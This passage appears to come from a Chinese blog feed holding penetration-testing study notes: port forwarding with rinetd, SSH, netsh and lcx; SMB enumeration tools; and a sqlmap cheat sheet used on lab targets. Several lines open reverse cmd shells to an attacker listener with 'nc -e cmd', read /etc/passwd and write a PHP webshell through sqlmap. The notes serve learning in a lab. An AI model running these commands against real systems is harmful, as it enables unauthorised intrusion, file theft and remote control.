<p>我们通常会遇到以下的状况，防火墙只允许内网中9999端口出站。如果我们此时需要让Server A能够访问外网的Web-Server，就需要借助到端口转发的技术了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200706_210525.jpg" alt=""><br>假设</p>
<ul>
<li>Proxy-Server的系统为Linux系统。IP为192.168.40.123</li>
<li>Server A IP为192.168.56.2 (56网段为内网)</li>
<li>FireWar(mon0wall) IP为192.168.56.1 WAN-IP为192.168.40.154</li>
<li>Web-Server IP为192.168.40.142</li>
</ul>
<p>参考:</p>
<ul>
<li><a href="http://xstarcd.github.io/wiki/sysadmin/rinetd.html" target="_blank" rel="noopener">rinted端口转发</a></li>
<li><a href="https://blog.creke.net/722.html" target="_blank" rel="noopener">SSH隧道及内网转发</a></li>
<li><a href="https://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html" target="_blank" rel="noopener">SSH远程操作与端口转发</a></li>
<li><a href="https://www.freebuf.com/sectool/126967.html" target="_blank" rel="noopener">LCX使用的三种方法</a><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2>安装rinted。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install rinted</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>编辑配置文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;rinted.conf</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0.0.0.0 监听本地所有的IP的1234端口</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Source Address] [Source Port] [Destination Address] [Destination Port]</span><br><span class="line">0.0.0.0 1234 目标ip 80</span><br></pre></td></tr></table></figure>

<p>主机 port 目标地址 port</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pkill rinted #有时候可能需要杀掉进程。</span><br><span class="line">sudo rinted  # 开启进程</span><br></pre></td></tr></table></figure>

<h2 id="开始配置-单层内网"><a href="#开始配置-单层内网" class="headerlink" title="开始配置(单层内网)"></a>开始配置(单层内网)</h2><p>防火墙只允许内网中9999端口出站。<br>Proxy-Server中配置/etc/rinted文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># bindadress    bindport  connectaddress  connectport</span><br><span class="line"> 0.0.0.0  9999       192.168.40.142  80</span><br></pre></td></tr></table></figure>

<p>接下来Server A直接在浏览器中访问Proxy-Server的IP地址和端口就好了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.123:9999</span><br></pre></td></tr></table></figure>
<h2 id="使用SSH加密隧道加密"><a href="#使用SSH加密隧道加密" class="headerlink" title="使用SSH加密隧道加密"></a>使用SSH加密隧道加密</h2><p>直接用rinted配置虽然简单。但是是明文传输的，这很容易被劫持以及信息泄露。为了避免劫持和信息泄露，所以可以使用SSH加密隧道来进行端口的转发。<a href="https://www.zsythink.net/archives/2450" target="_blank" rel="noopener">SSH加密隧道详解</a></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200706_221538.jpg" alt=""></p>
<blockquote>
<p>借助ssh隧道将通讯数据转发，虽然仍然跨越了公网，但是由于ssh本身的安全特性，所以别人无法看到明文传输的数据，数据依靠ssh隧道实现了加密的效果，达到了保护数据安全的作用，提升了客户端与服务端通讯的安全性。</p>
</blockquote>
<h3 id="怎么做？"><a href="#怎么做？" class="headerlink" title="怎么做？"></a>怎么做？</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>此时假设ServerA为Windows系统。<br>Windows系统下载一个xshell，或者其他的客户端。<br>Proxy-Server，开启sshd，并允许密码登录，设置SSH端口为9999端口，并关闭先前的rinted监听9999端口。</p>
<ol>
<li><p>Windows 使用xshell连接 ssh://192.168.40.123 -p 9999<br><img src="https://images.atsud0.me/images/post/Screenshot_20200706_221851.jpg" alt=""></p>
</li>
<li><p>新建一个隧道，关闭转发X11连接(默认开启)</p>
</li>
<li><p>添加一个转移连接。源地址填写localhost,端口填写1234(或者其他，但是不能端口冲突) 目标地址填写为Web-Server的地址和端口。</p>
</li>
</ol>
<p>编辑好后建立连接，Server打开浏览器访问本地127.0.0.1:9999即可。</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>此时假设ServerA为Linux系统。<br>因为Linux中一般都是预装openssh的，所以不用再做什么配置，直接一条命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -N -f -L 1234:192.168.40.142:80 username@192.168.40.123 -p 9999</span><br></pre></td></tr></table></figure>

<ul>
<li>-N 告诉SSH客户端，这个连接不需要执行任何命令。仅仅做端口转发</li>
<li>-f 告诉SSH客户端在后台运行</li>
<li>-L 做本地映射端口，被冒号分割的三个部分含义分别是<br>  需要使用的本地端口号<br>  需要访问的目标机器IP地址（IP: 192.168.40.142）<br>  需要访问的目标机器端口（端口: 80)</li>
</ul>
<p>最后一个参数是我们用来建立隧道的Proxy-Server的IP地址(IP: 192.168.40.123) -p 9999指定 ssh连接Proxy-Server的端口，因为防火墙只允许9999端口的流量出站。</p>
<p>执行好之后，直接本地访问127.0.0.1:1233即可看到Web-Server的数据了</p>
<h2 id="双层内网"><a href="#双层内网" class="headerlink" title="双层内网"></a>双层内网</h2><p>同样防火墙只允许内网中9999端口出站。不过此时多了一层内网。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200706_225913.jpg" alt=""></p>
<p>新添加的ServerB IP为192.168.1.2<br>ServerA 则是双IP</p>
<ul>
<li>192.168.1.1</li>
<li>192.168.56.2</li>
</ul>
<p>其他设备IP不变。此时要让内网机器ServerB能够访问到WebServer。</p>
<p>只需要在ServerA多做一个端口映射就好了。</p>
<h3 id="Windows系统命令"><a href="#Windows系统命令" class="headerlink" title="Windows系统命令"></a>Windows系统命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">添加一个IPV4到IPV4的端口映射</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress&#x3D;192.168.193.1 listenport&#x3D;22 connectaddress&#x3D;xxx.xxx.xxx.xxx connectport&#x3D;22</span><br><span class="line">指定监听ip和端口可以删除</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress&#x3D;192.168.193.1 listenport&#x3D;22</span><br><span class="line">可以查看存在的转发</span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>

<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p>同样也可以使用rinted。</p>
<h3 id="双层内网反弹nc-shell"><a href="#双层内网反弹nc-shell" class="headerlink" title="双层内网反弹nc shell"></a>双层内网反弹nc shell</h3><h4 id="方法一-使用netsh开启映射"><a href="#方法一-使用netsh开启映射" class="headerlink" title="方法一 使用netsh开启映射"></a>方法一 使用netsh开启映射</h4><p>ServerA直接使用netsh开启映射</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress&#x3D;0.0.0.0 listenport&#x3D;1200 connectaddress&#x3D;192.168.40.123 connectport&#x3D;9999</span><br></pre></td></tr></table></figure>

<p>优点:系统命令，不需要使用其他工具即可实现。<br>缺点:明文，需要管理员权限。</p>
<p>将原先Proxy-Server的端口映射地址改为攻击者的IP的攻击者监听的端口。<br>比如攻击者的IP和监听的端口为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.40.228 1234</span><br><span class="line">修改配置文件为</span><br><span class="line">0.0.0.0  9999       192.168.40.228  1234</span><br></pre></td></tr></table></figure>
<p>在攻击者的机器上开启监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
<p>ServerB 直接执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.1.2 1200 -e cmd</span><br></pre></td></tr></table></figure>

<p>此时在攻击者的机器上即可获得ServerB的cmd shell。</p>
<h4 id="方法二-利用SSH隧道反弹"><a href="#方法二-利用SSH隧道反弹" class="headerlink" title="方法二 利用SSH隧道反弹"></a>方法二 利用SSH隧道反弹</h4><p>优点:加密。<br>缺点:Windows中需要借助Xshell等其他连接SSH的工具。</p>
<p>先在ServerA上与攻击者建立SSH隧道。监听ServerA本地端口7890。</p>
<p>在ServerB机器中，执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.1.2 7890 -e cmd</span><br></pre></td></tr></table></figure>

<p>再回去看看攻击者的监听端口，就已经拿到ServerA的shell了。</p>
<h4 id="方法三-使用lcx端口反弹"><a href="#方法三-使用lcx端口反弹" class="headerlink" title="方法三 使用lcx端口反弹"></a>方法三 使用lcx端口反弹</h4><p>ServerA执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx -listen 7777 1111 # 监听本地的7777端口，并7777端口流量转发至1111端口。</span><br><span class="line">lcx -slave 127.0.0.1 1111 192.168.40.172 9999 #将本地的1111端口转发至远程192.168.40.172 9999端口</span><br></pre></td></tr></table></figure>
<p>ServerB执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.1.2 7777 -e cmd</span><br></pre></td></tr></table></figure>

<p>此时攻击者已经接收到了ServerB的shell了</p>
<h4 id="方法四-还是lcx端口反弹"><a href="#方法四-还是lcx端口反弹" class="headerlink" title="方法四 还是lcx端口反弹"></a>方法四 还是lcx端口反弹</h4><p>ServerA执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx -tran 7777 192.168.40.172 9999 # 将远程主机的端口映射到本地7777端口</span><br></pre></td></tr></table></figure>
<p>ServerB 执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.1.2 7777 -e cmd</span><br></pre></td></tr></table></figure>

<p>攻击者也已经收到了Shell了。</p>
<h3 id="SSH部分指令"><a href="#SSH部分指令" class="headerlink" title="SSH部分指令"></a>SSH部分指令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -X  username@host -p port # 允许远程打开图形界面</span><br><span class="line">SSH -L 本地端口转发</span><br><span class="line">SSH -R 远程端口转发</span><br><span class="line">SSH -D 动态转发</span><br><span class="line">ssh -NfL 0.0.0.0:1234:localhost:8000 127.0.0.1 #将允许任意ip连接的1234端口转发至本地的8000端口</span><br></pre></td></tr></table></figure>

<h2 id="socat端口转发"><a href="#socat端口转发" class="headerlink" title="socat端口转发"></a>socat端口转发</h2><p>除了用rinted和ssh也可以用这个socat来进行端口转发。</p>
<p>Github链接:<a href="https://github.com/craSH/socat" target="_blank" rel="noopener">socat</a></p>
]]></content>
  </entry>
  <entry>
    <title>smb笔记</title>
    <url>/2020/05/15/smb%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>记录smb的学习笔记</p>
<a id="more"></a>

<h1 id="什么是SMB"><a href="#什么是SMB" class="headerlink" title="什么是SMB?"></a>什么是SMB?</h1><p>smb全称<code>Server Message Block</code>,是一种客户端-服务器通信协议，用于共享对网络上文件，打印机，串行端口和其他资源的访问。<br>smb协议也被称为<code>response-request protocol</code> 响应请求协议,意味着它在客户端和服务器之间传输多个消息以建立连接。 客户端使用<code>TCP/IP</code>（实际上是RFC1001和RFC1002中指定的TCP/IP上的NetBIOS）连接到服务器，NetBEUI或IPX/SPX。<br><img src="https://i.imgur.com/XMnru12.png" alt="smbwork"></p>
<p>一旦建立了连接，客户机就可以向服务器发送命令，这些命令允许客户机访问共享、打开文件、读取和写入文件，并且通常可以执行使用文件系统执行的所有操作。对于SMB来说，这些是通过网络完成的。</p>
<p>smaba最初是为unix系统而发布的,虽然现在已经也支持windows版本.</p>
<h1 id="枚举smb信息"><a href="#枚举smb信息" class="headerlink" title="枚举smb信息"></a>枚举smb信息</h1><h2 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a><code>enum4linux</code></h2><p>kali已集成此工具.</p>
<p>arch 安装方式:<code>pacman -Ss enum4linux</code>(可能需要先添加blackarch源)</p>
<p>或者去<a href="https://github.com/portcullislabs/enum4linux" target="_blank" rel="noopener">official github</a>安装</p>
<p>语法: <code>enum4linux [options] ip</code></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>-U</td>
<td>get userlist</td>
</tr>
<tr>
<td>-M</td>
<td>get machine list</td>
</tr>
<tr>
<td>-N</td>
<td>get namelist dump (different from -U and-M)</td>
</tr>
<tr>
<td>-S</td>
<td>get sharelist</td>
</tr>
<tr>
<td>-P</td>
<td>get password policy information</td>
</tr>
<tr>
<td>-G</td>
<td>get group and member list</td>
</tr>
<tr>
<td>-A</td>
<td>all of the above (full basic enumeration)</td>
</tr>
</tbody></table>
<h2 id="nmap中的smb脚本"><a href="#nmap中的smb脚本" class="headerlink" title="nmap中的smb脚本"></a>nmap中的smb脚本</h2><p>![脚本路径](file:///home/vkk/atsud0.me/public<a href="https://images.atsud0.me/images/post/Screenshot_20200615_08053" target="_blank" rel="noopener">https://images.atsud0.me/images/post/Screenshot_20200615_08053</a></p>
<p>使用方法:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p139,445 -v --script=smb-enum-users.nse,smb-enum-groups.nse &#123;--script-args=.....&#125; &#123;target_ip&#125;</span><br></pre></td></tr></table></figure>

<h2 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h2><p>安装(kail应该是默认预装的)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nbtscan</span><br></pre></td></tr></table></figure>

<p>查找已经打开的共享(windows共享)<a href="https://tools.kali.org/information-gathering/nbtscan-unixwiz" title="" target="">nbtscan-kali-tools</a></p>
<p>最简单的使用方法(扫描一个网段已经打开udp137的主机)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nbtscan -r target_ip&#x2F;subnet_mask</span><br><span class="line">sudo nbtscan -r 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>

<h2 id="rbcclient"><a href="#rbcclient" class="headerlink" title="rbcclient"></a>rbcclient</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcclient -U &#39;&#39; &#123;target_ip&#125;</span><br></pre></td></tr></table></figure>
<p>如果一切正常，此时应该会让你输入密码。直接回车然后再输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;enumdomusers</span><br></pre></td></tr></table></figure>
<p>如果正常，应该会输出用户名信息。</p>
<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><p>linux中用于登录smb</p>
<p><code>smbclient //[IP]/[SHAREPATH]</code></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>-U [name]</td>
<td>用户名</td>
</tr>
<tr>
<td>-p [port]</td>
<td>端口</td>
</tr>
<tr>
<td>-N</td>
<td>no pass</td>
</tr>
<tr>
<td>-h</td>
<td>help</td>
</tr>
<tr>
<td>smbclient 参数较多只列出几个.</td>
<td></td>
</tr>
</tbody></table>
<h2 id="smbget"><a href="#smbget" class="headerlink" title="smbget"></a>smbget</h2><p>linux中用于批量下载smb信息</p>
<p><code>smbget -R //[IP]/[SHAREPATH]</code></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>-U [name]</td>
<td>用户名</td>
</tr>
<tr>
<td>-a</td>
<td>guest用户</td>
</tr>
<tr>
<td>-v</td>
<td>详细信息</td>
</tr>
<tr>
<td>-h</td>
<td>help</td>
</tr>
<tr>
<td>-q</td>
<td>安静模式</td>
</tr>
<tr>
<td>-e</td>
<td>加密传输</td>
</tr>
<tr>
<td>-u</td>
<td>只下载远端更新的文件</td>
</tr>
</tbody></table>
<h2 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h2><p>得先安装<code>cifs-utils</code></p>
<p>除了使用smbclient，还可以通过mount和smbcount挂载远程共享文件夹 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mount -t cifs -o user&#x3D;bob,sec&#x3D;ntlm,dir_mode&#x3D;0077,vers&#x3D;1.0 &quot;&#x2F;&#x2F;10.11.1.136&#x2F;Bob Share&#x2F;&quot; &#x2F;tmp&#x2F;bob</span><br><span class="line">sudo umount &#x2F;tmp&#x2F;bob</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>smb-enum</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap学习笔记</title>
    <url>/2020/05/15/sqlmap%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>sqlmap能让你生活更轻松…~</p>
<a id="more"></a>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S sqlmap</span><br></pre></td></tr></table></figure>

<p>windows系统下安装好python3并添加好python的环境变量后,直接将sqlmap的整个文件目录放到python安装目录下</p>
<ul>
<li>新建一个快捷方式-cmd</li>
<li>名称随便</li>
<li>右键cmd属性,将起始位置修改为sqlmap目录</li>
</ul>
<p>参考链接:</p>
<ul>
<li><a href="https://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" target="_blank" rel="noopener">sqlmap操作详解(常用备忘录)</a></li>
<li><a href="https://xz.aliyun.com/t/5982#toc-4" target="_blank" rel="noopener">Sqlmap学习使用小总结</a></li>
<li><a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Usage/Detection.html" target="_blank" rel="noopener">sqlmap使用手册</a></li>
<li><a href="https://xz.aliyun.com/t/3010" target="_blank" rel="noopener">落花四月-sqlmap-1</a></li>
<li><a href="https://xz.aliyun.com/t/3011" target="_blank" rel="noopener">落花四月-sqlmap-2</a></li>
</ul>
<h1 id="帮助列表-部分"><a href="#帮助列表-部分" class="headerlink" title="帮助列表(部分)"></a>帮助列表(部分)</h1><p>sql 基本参数<br>要想更详细,请<code>-hh</code></p>
<ul>
<li>-h 帮助信息</li>
<li>-hh 更详细的帮助</li>
<li>-u 指定url(GET请求要手动输入好注入点,sqlmap不会自动帮你检测)</li>
<li>-m url列表(扫描多个)</li>
<li>-r 加载HTTP请求文件(POST)</li>
<li>-l 从请求日志文件中查找注入点</li>
<li>-g google dork(google hacking)</li>
<li>-c 指定配置文件</li>
<li>-p 指定扫描的参数 -p “user-agent,referer” 如果指定了user-agent测试,那么不设置–level也能测试user-agent了</li>
<li>–skip 排除指定的扫描参数</li>
<li>-A 指定User-Agent信息</li>
<li>-H 指定请求头信息</li>
<li>–user-agents=””(指定user-agent)</li>
<li>–random-agent (level&gt;=3才启用 sqlmap检查user-agent的注入点)</li>
<li>–host 在主机信息头部注入,level=5</li>
<li>–referer referer头信息,level&gt;=3</li>
<li>–headers 头部信息必须使用<code>\n</code>换行,因为http请求头每个占用一行</li>
<li>–method=GET/POST 指定http请求为</li>
<li>–data 数据段 get/post都适用(主要用于post)</li>
<li>–param-del 变量分隔符</li>
<li>–cookie 检测cookie信息,(格式–cookie=”a=123;b=123”)</li>
<li>set-cookie 检查cookie中的注入点 lever为2</li>
<li>–batch 检测注入点</li>
<li>–dbms 指定后端数据库</li>
<li>–os 指定系统linux/windows</li>
<li>-f 数据库系统指纹信息</li>
<li>-b DBMS操作系统等信息</li>
<li>–lever=[num] 设置等级(1-5)默认1级 级别越高探测信息越多,但是速度越慢<ul>
<li>&gt;=2 cookie</li>
<li>&gt;=3 user-agent &amp;&amp; Referef</li>
<li>&gt;=5 host</li>
</ul>
</li>
<li>–risk=[num] 设置风险等级(1-3)默认1级 (风险越高会测试更多语句,如插入语句,更新语句,删除语句等级越高<strong>入狱</strong>可能性越高)<ul>
<li>1 大部分测试语句</li>
<li>2 增加基于事件的测试语句</li>
<li>3 增加or语句的sql注入测试(在update的语句中注入一个or的测试语句,可能导致整个表的更新)</li>
<li>测试的语句可以在xml/payloads.xml中找到</li>
</ul>
</li>
<li>–dump 导出</li>
<li>–dbs 爆出所有数据库</li>
<li>–current-db 爆出当前数据库名字</li>
<li>–current-user 当前连接数据库的用户</li>
<li>–privileges[-U] 用户权限</li>
<li>–is-dba 判断当前用户是否为管理员</li>
<li>–users 枚举数据库所有用户</li>
<li>–tables 爆出数据库的表</li>
<li>–columns 爆出所有列</li>
<li>–schema 枚举information_schema</li>
<li>-D [database_name]指定数据库枚举</li>
<li>-T [table_name]指定数据表枚举</li>
<li>-C [column_name]指定数据列枚举</li>
<li>–common-tables暴力破解表</li>
<li>–common-columns暴力破解列</li>
<li>–os-shell 使用sqlmap获得一个交互shell</li>
<li>–dump-all 导出所有数据</li>
<li>-v[num] 0-6 设置信息输出等级,默认为1<ul>
<li>0 显示pythobn错误以及严重的信息</li>
<li>1 同时显示基本信息和警告信息</li>
<li>2 同时显示debug信息</li>
<li>3 同时显示注入的payload</li>
<li>4 同时显示HTTP请求</li>
<li>5 同时显示HTTP响应头</li>
<li>6 同时显示HTTP响应页面</li>
</ul>
</li>
<li>–proxy=[http/https/socks5/socks4]://address:port 设置代理</li>
<li>–tor 使用tor代理(需要先配置好tor)</li>
<li>–check-tor 检测tor代理是否已使用</li>
<li>–second-url 双页面(dvwa-high)</li>
<li>–threads 最大并发线程(最大10)</li>
<li>-o开启前三个性能优化</li>
<li>–start [num] 与–stop配合,在获取信息时只获取指定的起始数值条数</li>
<li>–stop [num] 与–start配合,在获取信息时只获取指定的截止数值条数</li>
<li>–technique 指定选择的查询技术<ul>
<li>B: Boolean-based blind SQL injection（布尔型注入）</li>
<li>E: Error-based SQL injection（报错型注入）</li>
<li>U: UNION query SQL injection（可联合查询注入）</li>
<li>S: Stacked queries SQL injection（堆叠注入）</li>
<li>T: Time-based blind SQL injection（基于时间延迟注入</li>
</ul>
</li>
<li>–-time-sec 设置延时时间(默认是五秒,在使用tor/网络状态不好时可以调高)</li>
<li>–delay  下次请求的时间</li>
<li>–timeout 请求超时时间</li>
<li>–retrles 超时次数 默认三次</li>
<li>–randomize 长度</li>
<li>–scope 过滤日志内容(正则) 与<code>-l</code>配合使用</li>
<li>–sklp-urlencode 跳过url编码(适用于原始编码的网站)</li>
<li>–safe-url=[url] 设置目标网站能正常访问的地址作为安全链接地址(用于过滤一些防护)</li>
<li>–safe-freq=[num] 设置访问安全连接地址的频率,测试多少次后访问一次安全链接地址</li>
<li>–predict-output 优化性能,根据检测方法比对返回值和统计表内容,不断缩小检测范围,提高检测效率,与threads次数不兼容</li>
<li>–keep-alive 使用https长连接(保持存活,避免重复建立连接的网络开销,大量长连接会严重占用服务器资源) 代理服务器不支持长连接(与–proxy不兼容和)</li>
<li>–null-connection 获取相应的页面大小值,而非页面的具体内容,用于盲注降低网络资源消耗</li>
<li>–invalid-bignum 使用大数据使参数取值失效 id=909999</li>
<li>–invalid-logical 使用布尔判断使参数取值失效 id=13 and 18=19</li>
<li>–invalid-string 使用随机字符串使参数取值失效</li>
<li>–no-escape 不使用char()编码方式逃逸 <code>由于混淆和避免出错的目的,payload使用单引号界定字符串时,sqlmap使用char()编码逃逸方法替换字符串</code></li>
<li>–tamper=”*.py” 过WAF</li>
<li>–string</li>
<li>–not-string</li>
<li>–regexp</li>
<li>–code</li>
<li>–text-only</li>
<li>–titles</li>
<li>–hex 使用16进制编码</li>
<li>–output-dir=/tmp 指定输出路径</li>
<li>–save 将命令保存为一个文件</li>
<li>-z 参数助记符</li>
<li>–answer 指定答案</li>
<li>–check-waf 检测WAF</li>
<li>–mobile 模拟手机设备(修改user-agent为收集浏览器)</li>
<li>–purge-output 清除output文件夹</li>
<li>–smart当有大量检测目标时,选择基于错误的检测结果</li>
<li>–wizard 交互性</li>
<li>–crawl [num] 爬虫,爬取可能存在的漏洞链接 num是数字深度</li>
<li>–forms 自动获取form表单测试</li>
<li>–beep 发现sql注入时,发出蜂鸣</li>
<li>–gpage 默认sqlmap使用前100个URL地址作为注入测试,对指定页面的URL测试</li>
<li><code>*</code> 指定注入点(<a href="http://url//param1/value1*/param2/value2/" target="_blank" rel="noopener">http://url//param1/value1*/param2/value2/</a>) 跑伪静态网站</li>
<li>–file-read=RFILE  读取操作</li>
<li>–file-write=WFILE  写入操作</li>
<li>–file-dest=DFILE  绝对路径写入</li>
<li>–dns-domain  配合dns实现快速盲注</li>
</ul>
<h2 id="网站动态静态判断"><a href="#网站动态静态判断" class="headerlink" title="网站动态静态判断"></a>网站动态静态判断</h2><p><code>document.lastModified</code>(js函数)</p>
<h2 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 判断是否有注入</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; --batch</span><br><span class="line">2. 查看所有数据库</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; --dbs</span><br><span class="line">3. 查看当前使用的数据库</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; --current-db</span><br><span class="line">4. 查看数据表</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; -D security --tables</span><br><span class="line">5. 查看列名</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; -D security -T users --columns</span><br><span class="line">6. 查看数据</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; -D security -T users --dump</span><br></pre></td></tr></table></figure>


<h2 id="双页面的sqlmap使用方法"><a href="#双页面的sqlmap使用方法" class="headerlink" title="双页面的sqlmap使用方法"></a>双页面的sqlmap使用方法</h2><p>例子:dvwa sql注入 high难度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.2.243&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;session-input.php&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&amp;Submit&#x3D;Submit&quot; --second-url&#x3D;&quot;http:&#x2F;&#x2F;192.168.2.243&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;&quot; --current-db --cookie&#x3D;&quot;PHPSESSID&#x3D;p97k25g7mflas2kbg0asg7m161;security&#x3D;high&quot; --dbms&#x3D;mysql  -v 3 --dbs --threads&#x3D;10</span><br></pre></td></tr></table></figure>

<p>因为是post请求的,所以要加数据段<code>--data</code>,因为dvwa靶场要登录,所以也要携带<code>cookie</code>值</p>
<h2 id="safe-url用法"><a href="#safe-url用法" class="headerlink" title="safe-url用法"></a>safe-url用法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.2.243&#x2F;sql&#x2F;less-1&#x2F;?id&#x3D;1&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;192.168.2.243&#x2F;sql&#x2F;less-1&#x2F;&quot; --safe-freq&#x3D;2 --dbms&#x3D;mysql</span><br></pre></td></tr></table></figure>

<p>-u ‘url1’</p>
<p>–safe-url=’url2’ 安全页面</p>
<p>–safe-freq=2 </p>
<p>意味着在测试两次<code>url1</code>后去访问一次安全页面<code>url2</code></p>
<h2 id="写web-shell时会用到的参数"><a href="#写web-shell时会用到的参数" class="headerlink" title="写web shell时会用到的参数"></a>写web shell时会用到的参数</h2><ul>
<li>–file-read=RFILE  读取操作</li>
<li>–file-write=WFILE  写入操作</li>
<li>–file-dest=DFILE  绝对路径写入</li>
<li>–is-dba 判断当前用户是否为管理员</li>
</ul>
<p>读取文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user&quot; -p add_value --file-read&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>写文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user&quot; -p add_value --file-write&#x3D;&#x2F;data&#x2F;yjh.php --file-dest&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;jabc&#x2F;shell.php</span><br></pre></td></tr></table></figure>



<p>tamper</p>
<p><a href="https://xz.aliyun.com/t/2746" target="_blank" rel="noopener">https://xz.aliyun.com/t/2746</a></p>
<p>mssql</p>
<p><a href="https://www.anquanke.com/post/id/156911" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156911</a></p>
<p>免杀webshell</p>
<p><a href="https://www.sqlsec.com/2020/07/shell.html#toc-heading-25" target="_blank" rel="noopener">https://www.sqlsec.com/2020/07/shell.html#toc-heading-25</a></p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>sql_injection</tag>
